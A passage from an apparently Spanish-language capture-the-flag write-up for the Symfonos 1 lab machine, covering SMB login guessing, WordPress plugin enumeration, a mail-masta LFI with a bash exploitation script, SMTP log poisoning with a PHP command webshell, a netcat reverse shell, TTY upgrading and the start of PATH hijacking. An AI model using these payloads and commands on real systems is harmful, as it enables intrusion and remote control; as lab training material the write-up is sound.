<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Instalamos virtualenv para python2</span></span><br><span class="line"><span class="built_in">sudo</span> pacman -S python2-virtualenv</span><br><span class="line"></span><br><span class="line"><span class="comment"># Una dependencia que hace falta para que el entorno virtual funcione</span></span><br><span class="line"><span class="built_in">sudo</span> pacman -S python2-typing</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creamos el entorno</span></span><br><span class="line">python2 -m virtualenv entorno</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nos colocamos dentro del entorno virtual</span></span><br><span class="line"><span class="built_in">source</span> entorno/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># Instalamos la dependencia paramiko para ejecutar el script</span></span><br><span class="line">pip install paramiko</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nos saldrá un error de paramiko aunque se puede ejecutar igual</span></span><br><span class="line">python2 ssh_enum_user.py 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>

<p>Y ahora podemos comprobar si es válido la enumeración de usuarios a través de sss:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 ssh_enum_user.py 192.168.1.178 root 2&gt;/dev/null</span><br><span class="line">python2 ssh_enum_user.py 192.168.1.178 rogsfdkjgsdfot 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/ssh_attempt_valid_user_failed.png" class="" title="Intento fallido de enumeración de usuarios.">

<p>Podemos apreciar que no funciona, así que a otra cosa mariposa.</p>
<p>Para salir del entorno virtual usa la palabra <strong>deactivate</strong>.</p>
<h2 id="Acceso-al-usuario-helios-desde-samba"><a href="#Acceso-al-usuario-helios-desde-samba" class="headerlink" title="Acceso al usuario helios desde samba"></a>Acceso al usuario helios desde samba</h2><p>Cuando nos conectamos con smbclient, vimos un recurso compartido llamado <strong>helios</strong> y en el comentario decia “Helios personal share”</p>
<p>¿Y si probamos a conectarnos con helios a dicho recurso usando el protocolo smb?<br>Lo primero de todo es añadirlo a nuestro “diccionario” de usuarios, a continuación, probamos a conectarnos y probamos las contraseñas(en este caso podemos una a una porque son tres)</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //192.168.1.178/helios -U helios</span><br></pre></td></tr></table></figure></div>

<p>Y con la contraseña <strong>qwerty</strong> vemos que nos deja listar. A continuación procedemos a entrar como dicho usuario.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.1.178/helios -U helios</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Descargamos todos los archivos.</span></span><br><span class="line">mget *</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/helios_file_smb.png" class="" title="Acceso y descargas de archivos en el directorio helios">

<p>En el archivo <strong>todo.txt</strong> podemos encontrar diferente información:</p>
<img src="/2024/12/04/Symfonos%201%20y%202/contenido_todo_helios.png" class="" title="Contenido del archivo todo.">

<p>De aquí nos fijamos en el directorio encontrado y lo abrimos en el navegador.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/primer_vistazo_wordpress_helios.png" class="" title="Primer vistazo de la página wordpress">

<p>¿Pero porque se ve así de feo?</p>
<h2 id="Virtual-hosting"><a href="#Virtual-hosting" class="headerlink" title="Virtual hosting"></a>Virtual hosting</h2><p>Si hacemos ctrl+u para ver el código fuente opdemos encontrar que esta cargado los recursos desde <strong>symfonos.local</strong>, pero claro, mi equipo no conoce este dominio.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/ping_symfonos_local.png" class="" title="ping fallido a symfonos local">

<p>Para solucionar esto deberemos modificar el &#x2F;etc&#x2F;hosts de nuestro equipo y añadir dicho nombre de dominio.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/a%C3%B1adir_symfonos_local_etc_hosts.png" class="" title="Añadimos symfonos.local al &#x2F;etc&#x2F;hosts">

<p>Ya solo con recargar la página web podemos apreciar que cargan los recursos y podemos hacer ping perfectamente.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/wordpress_cargado_symfonos.png" class="" title="Wordpress cargado.">

<p>En la página podemos apreciar que el post lo ha realizado admin, entonces ya sabemos que es un usurio válido.</p>
<p>Podemos abrir wappalyzer y vemos la versión de wordpress y jquery, podemos apreciar que son algo obsoletas y tienen expuestas algunas vulnerabilidades, aunque no nos interesa para resolver este CTF.</p>
<h2 id="Enumeracion-de-plugins-de-Wordpress"><a href="#Enumeracion-de-plugins-de-Wordpress" class="headerlink" title="Enumeración de plugins de Wordpress"></a>Enumeración de plugins de Wordpress</h2><p>En lugar de utilizar WPScan y automatizar las cosas vamos a seguir de <strong>forma manual,</strong> puede ser algo más tedioso y complicado para algunas personas, pero si quieres ser un buen hacker debes acostumbrarte a seguir esta metodología.</p>
<p>Empezamos comprobando si el directorio <strong>&#x2F;wp-content&#x2F;plugins&#x2F;</strong> tiene capacidad de directory listening, pero este esta vacío.</p>
<p>Si volvemos al código fuente podemos enumerar alguno de ellos a simple vista(ojo no tiene porque aparecer todos los plugins en el código fuente). Podemos utilizar este oneliner para recoger todos estos plugins.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X GET <span class="string">&quot;http://192.168.1.178/h3l105/&quot;</span> | grep <span class="string">&quot;wp-content&quot;</span> | grep -oP <span class="string">&quot;&#x27;.*?&#x27;&quot;</span> | grep <span class="string">&quot;symfonos.local&quot;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;/&#x27;</span> -f 1-7 | <span class="built_in">sort</span> -u | grep plugins</span><br></pre></td></tr></table></figure></div>

<ol>
<li><strong>curl -s -X GET</strong> -&gt; Realizamos una petición con el modo silencioso(-s) y por el método GET(-X)</li>
<li><strong>grep “wp-content”</strong> -&gt; Obtenemos las líneas que contengan <strong>wp-content</strong>.</li>
<li><strong>grep -oP “‘.*?’”</strong>* -&gt; Expresión regular para ibtenemos todo el contenido que está entre comillas siples(‘’).</li>
<li><strong>grep “symfonos.local”</strong> -&gt; Nos quitamos otros matches no deseados.</li>
<li><strong>cut -d ‘&#x2F;‘ -f 1-7</strong> -&gt; Utilizamos cut con delimitador(-d) para indicar que queremos que nos muestre <strong>hasta</strong> la séptima barra.</li>
<li><strong>sort -u</strong> -&gt; Ordenamos alfabéticamente y quitamos los matches repetidos.</li>
<li><strong>grep plugins</strong> -&gt; Filtramos por plugins.</li>
</ol>
<img src="/2024/12/04/Symfonos%201%20y%202/enumeracion_plugins.png" class="" title="Enumeración de plugins manual.">

<p>¿mail-masta?<br>En el escaneo de puertos vimos el puerto 25 abierto, <strong>SMTP servicio de correo electrónico</strong>.</p>
<h1 id="Explotacion"><a href="#Explotacion" class="headerlink" title="Explotación"></a>Explotación</h1><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>Dadas estas coincidencias podemos buscar con <code>searchsploit</code> dicho plugin.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit mail masta</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/searchsploit_mail_masta.png" class="" title="Buscamos en searchsploit el plugin mail masta.">

<p>Revisamos el txt <code>searchsploit -x 40290.txt</code> y encontramos la ruta vulnerable al LFI -&gt; &#x2F;wp-content&#x2F;plugins&#x2F;mail-masta&#x2F;inc&#x2F;campaign&#x2F;count_of_send.php?pl&#x3D;&#x2F;etc&#x2F;passwd</p>
<img src="/2024/12/04/Symfonos%201%20y%202/prueba_del_lfi_mail_masta.png" class="" title="Probamos el lfi.">

<p>Y efectivamente, logramos el LFI.</p>
<h3 id="Script-en-bash-para-realizar-el-LFI-desde-consola"><a href="#Script-en-bash-para-realizar-el-LFI-desde-consola" class="headerlink" title="Script en bash para realizar el LFI desde consola"></a>Script en bash para realizar el LFI desde consola</h3><p>¡Genial!, hemos comprobado que podemos leer archivos, por lo que es más cómodo creándonos un script en bash para trabajar de manera más cómoda:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">check_dependencies</span></span>()&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;[+] Checking... [+]&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Check if gum is installed.</span></span><br><span class="line">	gum -h &amp;&gt;/dev/null</span><br><span class="line">	<span class="keyword">if</span> [[ $? -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">exit</span> 1</span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># For use the function in subshells(in gum)</span></span><br><span class="line"><span class="built_in">export</span> -f check_dependencies</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check dependices</span></span><br><span class="line">gum spin --spinner dot --title <span class="string">&quot;Checking dependencies..&quot;</span> -- bash -c <span class="string">&quot;check_dependencies&quot;</span> </span><br><span class="line"></span><br><span class="line">exit_code=$?</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$exit_code</span> -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">	<span class="keyword">if</span> [[ <span class="variable">$exit_code</span> -eq 1 ]]; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">read</span> -p <span class="string">&quot;[*] Gum is not installed, do you want to install(y/n)?&quot;</span> option</span><br><span class="line">		<span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$option</span>&quot;</span> != <span class="string">&quot;y&quot;</span> &amp;&amp; <span class="string">&quot;<span class="variable">$option</span>&quot;</span> != <span class="string">&quot;Y&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">echo</span> -e <span class="string">&quot;\nSee you soon:)&quot;</span></span><br><span class="line">			<span class="built_in">exit</span> 2</span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">	os_install_dependencies</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">os_install_dependencies</span></span>()&#123;</span><br><span class="line">	type_os=$(<span class="built_in">cat</span> /etc/os-release | <span class="built_in">head</span> -n 1 | grep -oP <span class="string">&quot;\&quot;.*?\&quot;&quot;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;<span class="variable">$type_os</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">		<span class="string">&quot;Arch Linux&quot;</span>)</span><br><span class="line">			<span class="built_in">sudo</span> pacman -S gum</span><br><span class="line">			;;</span><br><span class="line">		<span class="string">&quot;Kali GNU/Linux&quot;</span>)</span><br><span class="line">			<span class="built_in">sudo</span> apt install gum</span><br><span class="line">			;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">esac</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start program</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">help_panel</span></span>()&#123;</span><br><span class="line">	gum style \</span><br><span class="line">        	--foreground 212 --border-foreground 212 --border double \</span><br><span class="line">        	--align center --width 50 --margin <span class="string">&quot;1 2&quot;</span> --padding <span class="string">&quot;2 4&quot;</span> \</span><br><span class="line">        	<span class="string">&#x27;Help Panel :o&#x27;</span> <span class="string">&#x27; ---------------&#x27;</span> <span class="string">&#x27; -h -&gt; Help Panel&#x27;</span> <span class="string">&#x27; -u -&gt; Indicate the URL, ex:&#x27;</span> <span class="string">&#x27;http:/example.com/file.php?=LFI&#x27;</span>	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">lfi</span></span>()&#123;</span><br><span class="line">	url=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line">	exit_order=<span class="string">&quot;qa!&quot;</span></span><br><span class="line">	<span class="built_in">exit</span>=0</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Jump line</span></span><br><span class="line">	<span class="built_in">echo</span></span><br><span class="line">	<span class="keyword">while</span> [[ <span class="variable">$exit</span> -ne 1 ]]; <span class="keyword">do</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment"># Indicate the file</span></span><br><span class="line">		gum input --placeholder <span class="string">&quot;/etc/passwd or qa! to exit&quot;</span> &gt; .file.tmp</span><br><span class="line">		file=$(<span class="built_in">cat</span> .file.tmp)</span><br><span class="line">		<span class="built_in">shred</span> -u .file.tmp</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$file</span>&quot;</span> != <span class="string">&quot;<span class="variable">$exit_order</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">			full_url=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$url</span>&quot;</span> | sed -e <span class="string">&quot;s|LFI|<span class="variable">$file</span>|g&quot;</span>)</span><br><span class="line">	</span><br><span class="line">			curl -s -X GET <span class="string">&quot;<span class="variable">$full_url</span>&quot;</span> -o .data.tmp</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> [[ -s .data.tmp ]]; <span class="keyword">then</span></span><br><span class="line">				gum pager &lt; .data.tmp</span><br><span class="line">				<span class="built_in">shred</span> -u .data.tmp</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				gum <span class="built_in">log</span> --structured --level error <span class="string">&quot;File not found.&quot;</span> name <span class="string">&quot;<span class="variable">$file</span>&quot;</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">exit</span>=1</span><br><span class="line">		<span class="keyword">fi</span>	</span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Menu</span></span><br><span class="line">help_panel_shof=<span class="literal">false</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">&quot;hu:&quot;</span> opt; <span class="keyword">do</span></span><br><span class="line">	<span class="keyword">case</span> <span class="variable">$opt</span> <span class="keyword">in</span></span><br><span class="line">		u) lfi <span class="variable">$OPTARG</span> ;;</span><br><span class="line">		h) help_panel ;;</span><br><span class="line">		?) help_panel ;;</span><br><span class="line">	<span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if first argument was usage, if not keep be 1(when execute the program without switches.)</span></span><br><span class="line"> <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$OPTIND</span>&quot;</span> -eq 1 ]]; <span class="keyword">then</span></span><br><span class="line">	help_panel</span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/lfi_script.gif" class="" title="Funcionamiento del script">

<p>No es el mejor script, pero funciona, ya os dejo a vostros restructurarlo y mejorarlo.</p>
<h2 id="LFI-to-RCE-Log-poisoning"><a href="#LFI-to-RCE-Log-poisoning" class="headerlink" title="LFI to RCE. Log poisoning."></a>LFI to RCE. Log poisoning.</h2><p>Primero de todo, en el &#x2F;etc&#x2F;passwd podemos ver que usiarios disponen de una shell asignada, en este caso nos aparece el usuario root y <strong>helios</strong>.<br>Hemos visto que la máquina tiene el ssh abierto.<br>¿Y sí el usuario helios dispone de una key para conectarse?</p>
<h3 id="Intento-de-visualizacion-de-clave-privada-ssh-de-helios"><a href="#Intento-de-visualizacion-de-clave-privada-ssh-de-helios" class="headerlink" title="Intento de visualización de clave privada ssh de helios"></a>Intento de visualización de clave privada ssh de helios</h3><p>Ver la clave privada de helios</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/helios/.ssh/id_rsa</span><br></pre></td></tr></table></figure></div>

<h3 id="Listar-procesos-en-ejecuccion"><a href="#Listar-procesos-en-ejecuccion" class="headerlink" title="Listar procesos en ejecucción"></a>Listar procesos en ejecucción</h3><p>Podemos intentar listas procesos desde el <strong>&#x2F;proc&#x2F;schedstat</strong></p>
<p>No nos sale nada de información útil…</p>
<p>Puedes probar con <strong>&#x2F;proc&#x2F;scheddebug</strong>, pero tampoco encuentra nada.</p>
<h3 id="Apache-ssh-mail-Log-poisoning"><a href="#Apache-ssh-mail-Log-poisoning" class="headerlink" title="Apache, ssh, mail Log poisoning"></a>Apache, ssh, mail Log poisoning</h3><p>Comprobamos si los logs están disponibles, comprobando si podemos ver algunas de las siguientes rutas(por defecto):</p>
<ul>
<li>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log (apache)</li>
<li>&#x2F;var&#x2F;log&#x2F;auth.log (ssh)</li>
<li>&#x2F;var&#x2F;mail&#x2F;helios (smtp)</li>
</ul>
<p>Este último archivo si lo podemos ver:</p>
<img src="/2024/12/04/Symfonos%201%20y%202/mail_log_helios.png" class="" title="Log smtp de helios">

<p>Genial!, podemos aprovechar que estamos en una ruta donde se esta ejecutando un código .php(count_of_send.php) para intentar mandar código php y que se interprete.</p>
<p>¿Cómo podemos generar logs en dicho fichero?</p>
<p>Podemos enviar un mail con <strong>telnet</strong> aunque también lo puedes hacer con netcat:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nos conectamos a la máquina por el puerto 25</span></span><br><span class="line">telnet 192.168.1.178 25</span><br><span class="line"></span><br><span class="line"><span class="comment"># Podemos comprobar si no require autenticación y podemos enviar directamente un correo:</span></span><br><span class="line"></span><br><span class="line">MAIL FROM: sergiky</span><br><span class="line">RCPT TO: helios</span><br><span class="line">DATA</span><br><span class="line">&lt;?php system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); ?&gt;</span><br><span class="line">.</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/send_mail.png" class="" title="Correo enviado usando telnet.">

<p>Comprobamos el fichero de log:</p>
<img src="/2024/12/04/Symfonos%201%20y%202/comprobacion_correo_enviado_log.png" class="" title="Entrada en el log del correo mandado.">

<p>Vemos que no aparece el contenido, ¿lo habrá interpretado?</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X GET <span class="string">&#x27;http://192.168.1.178/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=id&#x27;</span></span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/lfi_rce_exitoso.png" class="" title="Comprobación del RCE">

<h3 id="Conectarse-con-netcat"><a href="#Conectarse-con-netcat" class="headerlink" title="Conectarse con netcat"></a>Conectarse con netcat</h3><p>Vamos a ganar acceso al equipo conectándonos con netcat, para ellos podemos comprobar que netcat esta instalado, para debemos de poner <strong>which+nc</strong>, recuerda URL encodearlo para que funciona(en este caso solo el espacio).</p>
<p>Vemos que sí, pues podemos lanzar una shell hacía nuestro equipo de la siguiente manera:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Nos ponemos en escucha desde nuestro equipo(en otra consola):</span></span><br><span class="line">nc -nlvp 443</span><br><span class="line"></span><br><span class="line"><span class="comment"># Comando para mandar la shell desde la víctima a nuestro equipo:</span></span><br><span class="line">curl -s -X GET <span class="string">&#x27;http://192.168.1.178/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=nc+-e+/bin/bash+192.168.1.160+443&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/reverse_shell_con_nc.png" class="" title="Reverse shell con netcat.">

<p>En el último comando(hostname -I) podéis apreciar que hay dos tarjetas de red verdad?…:)</p>
<h3 id="Tratamiento-de-la-TTY"><a href="#Tratamiento-de-la-TTY" class="headerlink" title="Tratamiento de la TTY"></a>Tratamiento de la TTY</h3><p>Pero vemos que esta rara, no parece una terminal a la que estamos acostumbrados.</p>
<p>Para ello nos podemos lanzar una pseudoconsola, simulamos una nueva sesión de una bash sin dejar el registro predeterminado que deja script porque lo estamos dirigendo al &#x2F;dev&#x2F;null:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br></pre></td></tr></table></figure></div>

<p>No pasa nada si veis el prompt raro, esto es porque<br>las proporciones no son las adecuadas con las nuestras.</p>
<p>A continuación realizamos un <strong>ctrl+z</strong>.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset xterm</span><br></pre></td></tr></table></figure></div>
<p>Ahora puedes realizar ctrl+c(antes se te salia de laconsola), pero no podemos hacer ctr+l para limpiar la pantalla, para eso utilizamos:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure></div>

<p>Para adecuar las proporciones de la nuevas terminal, debemos obtener las proporciones de una terminal nuestra identica de tamaño y poner el siguiente comando:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> size</span><br></pre></td></tr></table></figure></div>

<p>Los resultados obtenimos los vamos a introducir a la máquina víctima:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> rows 20 columns 84</span><br></pre></td></tr></table></figure></div>

<p>Ahora veremos que se ha corregido el prompt y podemos hacer un nano para ver que las dimensiones son correctas.</p>
<h1 id="Escalada-de-privilegios"><a href="#Escalada-de-privilegios" class="headerlink" title="Escalada de privilegios"></a>Escalada de privilegios</h1><p>Una vez aquí antes de raelizar la escalada, podemos ver contra que sistema operativo estamos, para ello utilizamos el comando <strong>lsb_release -a</strong> y podemos apreciar que es un <strong>stretch</strong> como vimos anteriormente el codename</p>
<img src="/2024/12/04/Symfonos%201%20y%202/lsb_release_symfonos1.png" class="" title="lsb_release sobre Symfonos1">

<p>Utilizamos el comando <strong>id</strong> y vemos que no hay ningún grupo interesante, buscamos por archivos con privilegios <strong>SUID</strong>(Nos permite ejecutar un archivo como si del propietario tratarse, preferiblementpreferiblementestos casos):</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -user root 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/buscar_privilegios_suid.png" class="" title="Buscamos por archivos con privilegios SUID">

<p>Si miramos con file lo que es, vemos que es un binario compilado de 64 bits para Linux.</p>
<p>Si probáis a ejecutarlo, veréis que os saldrá un output similar al del comando <strong>curl</strong>, si miramos con con <strong>strings</strong> para ver los caracteres legibles y usando less para empezar desde arriba:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /opt/statuscheck | less</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/strings_sobre_check_status_symfonos1.png" class="" title="Strings sobre el binario">

<p>¿Qué podemos intuir aquí?<br>Que <strong>no se están ejecutando rutas absolutas(&#x2F;usr&#x2F;bin&#x2F;curl)</strong>, al cometer este fallo podemos realizar <strong>path hijacking</strong>, sucedería lo mismo si estuvieramos importando librerías de algún sitio sin usar rutas absolutas, Library Hijacking.</p>
<h2 id="Path-Hijacking"><a href="#Path-Hijacking" class="headerlink" title="Path Hijacking"></a>Path Hijacking</h2><p>Esta técnica aprovecha el uso de ruta relativa en lugar de absoluta, cuando no explicas donde está situado dicho binario, automáticamente, empieza a recorrer el PATH(echo $PATH), hasta que encuentra el binario en alguna de las rutas indicadas, en este caso, curl estaría en &#x2F;usr&#x2F;bin&#x2F;.</p>
<p>Podemos aprovecharnos de esto modificando el PATH y añadiendo una ruta <strong>antes</strong> de la mencionada, así se ejecutaría el programa que se llame curl(<strong>que vamos a crear nosotros</strong>) en la <strong>nueva ruta que añadamos</strong>. Y si recordamos lo que he comentado anteriormente, este archivo es ejecutado como root(al igual que curl que está dentro de él).</p>
<p>Vamos a crear el archivo curl, en este caso me voy a ir al directorio <strong>&#x2F;dev&#x2F;shm&#x2F;</strong> que es el útilizado para la memoria RAM, son datos temporales(cuando se reinicie la máquina se borran) y de gran velocidad.</p>
